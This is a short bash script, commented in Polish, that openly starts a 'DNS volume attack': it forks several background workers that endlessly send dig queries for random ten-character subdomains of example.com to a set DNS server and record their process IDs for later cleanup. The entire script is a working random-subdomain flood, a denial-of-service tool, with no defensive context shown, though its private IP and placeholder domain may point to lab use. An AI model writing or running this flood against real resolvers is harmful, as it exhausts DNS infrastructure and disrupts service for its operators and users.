#!/bin/bash

# ==============================
# KONFIGURACJA
# ==============================
DNS_SERVER="10.0.0.53"
DOMAIN_BASE="example.com"
PIDFILE="/tmp/dns_attack.pid"

# ==============================
# PARAMETR: LICZBA WORKERÓW
# ==============================
WORKERS=${1:-8}   # domyślnie 8 jeśli nie podano argumentu

echo "[*] Starting DNS volume attack"
echo "[*] Workers: $WORKERS"
echo "[*] DNS server: $DNS_SERVER"

# Wyczyść stary PIDFILE
rm -f "$PIDFILE"

# ==============================
# START ATAKU
# ==============================
for i in $(seq 1 "$WORKERS"); do
    sh -c "
    while true; do
        name=\$(cat /proc/sys/kernel/random/uuid | tr -d '-' | cut -c1-10)
        dig @$DNS_SERVER \${name}.$DOMAIN_BASE +tries=1 +timeout=1 >/dev/null 2>&1
    done
    " &

    echo $! >> "$PIDFILE"
done

echo "[*] Attack started. PIDs saved to $PIDFILE"

